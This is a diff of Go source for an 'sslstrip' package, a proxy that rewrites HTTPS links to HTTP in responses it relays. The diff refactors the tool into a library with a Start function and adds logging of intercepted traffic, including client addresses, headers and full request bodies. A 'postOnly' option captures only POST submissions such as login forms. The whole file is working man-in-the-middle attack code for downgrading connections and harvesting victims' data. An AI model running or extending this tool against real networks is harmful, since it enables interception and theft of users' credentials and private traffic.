@@ -1,22 +1,29 @@
-package main
+package sslstrip
 
 import (
 	"bytes"
 	"compress/gzip"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
 	"net/url"
+	"os"
 	"regexp"
 	"strings"
 	"sync"
+	"time"
 )
 
-type server struct{}
+type server struct {
+	logger      io.Writer
+	postOnly    bool
+	logResponse bool
+}
 
 // clientLink stores client ip and url pair.
-// 
+//
 // We use as a key in the cache which stores
 // the stripped links and their originals
 type clientLink struct {
@@ -54,11 +61,6 @@ func getLink(cl clientLink) (string, bool) {
 	mu.RLock()
 	defer mu.RUnlock()
 	link, exists := storedLinks[cl]
-
-	// for key, val := range storedLinks {
-	// 	fmt.Printf("RemoteAddr: %q\t%q\t%q\n", key.clientIP, key.url, val)
-	// }
-	// fmt.Println()
 
 	return link, exists
 }
@@ -162,7 +164,7 @@ func stripResponse(req *http.Request, res *http.Response) ([]byte, error) {
 		strippedUrl, err := normalizeUrl("http://" + url[8:])
 
 		if err != nil {
-			fmt.Printf("Warning: could not normalize url %s: %q\n", url, err)
+			fmt.Fprintf(os.Stderr, "Warning: could not normalize url %s: %q\n", url, err)
 			return u
 		}
 
@@ -182,27 +184,12 @@ func (s server) ServeHTTP(responseWriter http.ResponseWriter, req *http.Request)
 	// read request body
 	reqBody, err := ioutil.ReadAll(req.Body)
 	if err != nil {
-		fmt.Println("Could not get body")
+		fmt.Fprintf(os.Stderr, "Could not get body: %q\n", err)
 		return
 	}
-
-	fmt.Println("Incoming request:")
-	// fmt.Printf("Method: %q\n", req.Method)
-	// fmt.Printf("URL: %q\n", req.URL)
-	// fmt.Printf("Proto, ProtoMajor, ProtoMinor: %q %q %q\n", req.Proto, req.ProtoMajor, req.ProtoMinor)
-	// fmt.Printf("Header: %q\n", req.Header)
-	// fmt.Printf("Host: %q\n", req.Host)
-	// fmt.Printf("Content-Length: %q\n", req.ContentLength)
-	// fmt.Printf("Transfer-encoding: %q\n", req.TransferEncoding)
-	// fmt.Printf("Close: %v\n", req.Close)
-	// fmt.Printf("Form: %q\n", req.Form)
-	// fmt.Printf("PostForm: %q\n", req.PostForm)
-	// fmt.Printf("MultipartForm: %q\n", req.MultipartForm)
-	// fmt.Printf("Trailer: %q\n", req.Trailer)
-	// fmt.Printf("RemoteAddr: %q\n", req.RemoteAddr)
-	// fmt.Printf("RequestUri: %q\n", req.RequestURI)
-	// fmt.Printf("Body: %q\n", reqBody)
-	// fmt.Println("")
+	if !s.postOnly || req.Method == "POST" {
+		fmt.Fprintf(s.logger, "%q %q %q %q\nHeaders: %q\nBody: %q\n\n", time.Now().Format(time.RFC850), req.RemoteAddr, req.Method, req.URL, req.Header, reqBody)
+	}
 
 	// build request to be made
 	proxyReq := &http.Request{
@@ -219,7 +206,7 @@ func (s server) ServeHTTP(responseWriter http.ResponseWriter, req *http.Request)
 	res, err := makeRequest(proxyReq)
 
 	if err != nil {
-		fmt.Printf("Error occurred when making proxy request: %q\n", err)
+		fmt.Fprintf(os.Stderr, "Error occurred when making proxy request: %q\n", err)
 		return
 	}
 
@@ -227,7 +214,7 @@ func (s server) ServeHTTP(responseWriter http.ResponseWriter, req *http.Request)
 	if res.Header.Get("Content-Encoding") == "gzip" {
 		reader, err := gzip.NewReader(res.Body)
 		if err != nil {
-			fmt.Printf("Error when decompressing response body: %q\n", err)
+			fmt.Fprintf(os.Stderr, "Error when decompressing response body: %q\n", err)
 			return
 		}
 		res.Body = reader
@@ -236,8 +223,12 @@ func (s server) ServeHTTP(responseWriter http.ResponseWriter, req *http.Request)
 	// strip response
 	strippedBody, err := stripResponse(req, res)
 	if err != nil {
-		fmt.Printf("Error when stripping response: %q\n", err)
+		fmt.Fprintf(os.Stderr, "Error when stripping response: %q\n", err)
 		return
+	}
+
+	if s.logResponse {
+		fmt.Fprintf(s.logger, "%q %q %q %q %q\nHeaders: %q\nBody: %q\n\n", time.Now().Format(time.RFC850), req.RemoteAddr, res.StatusCode, res.Status, req.URL, res.Header, strippedBody)
 	}
 
 	// compress stripped body if necessary
@@ -249,19 +240,6 @@ func (s server) ServeHTTP(responseWriter http.ResponseWriter, req *http.Request)
 		writer.Close()
 		strippedBody = b.Bytes()
 	}
-
-	// fmt.Println("Fetched response:")
-	// fmt.Printf("Status: %q\n", res.Status)
-	// fmt.Printf("StatusCode: %q\n", res.StatusCode)
-	// fmt.Printf("Proto: %q\n", res.Proto)
-	// fmt.Printf("ProtoMajor: %q\n", res.ProtoMajor)
-	// fmt.Printf("ProtoMinor: %q\n", res.ProtoMinor)
-	// fmt.Printf("Header: %q\n", res.Header)
-	// fmt.Printf("Content-Length: %q\n", res.ContentLength)
-	// fmt.Printf("Transfer-Encoding: %q\n", res.TransferEncoding)
-	// fmt.Printf("Uncompressed: %v\n", res.Uncompressed)
-	// fmt.Printf("Trailer: %v\n", res.Trailer)
-	// fmt.Println("")
 
 	// build headers that will be returned to the client
 	header := responseWriter.Header()
@@ -277,12 +255,34 @@ func (s server) ServeHTTP(responseWriter http.ResponseWriter, req *http.Request)
 	_, err = responseWriter.Write(strippedBody)
 
 	if err != nil {
-		fmt.Printf("Error when sending response body to client: %q\n", err)
+		fmt.Fprintf(os.Stderr, "Error when sending response body to client: %q\n", err)
 		return
 	}
 }
 
-func main() {
-	var s server
-	log.Fatal(http.ListenAndServe("0.0.0.0:8000", s))
+type Params struct {
+	Port        int
+	Filename    string
+	PostOnly    bool
+	LogResponse bool
+}
+
+func Start(p Params) {
+	var writer io.Writer = os.Stdout
+	var err error
+
+	if p.Filename != "" {
+		writer, err = os.Create(p.Filename)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "Could not open file %q: %q\n", p.Filename, err)
+			return
+		}
+	}
+
+	s := server{
+		writer,
+		p.PostOnly,
+		p.LogResponse,
+	}
+	log.Fatal(http.ListenAndServe(fmt.Sprintf("0.0.0.0:%d", p.Port), s))
 }
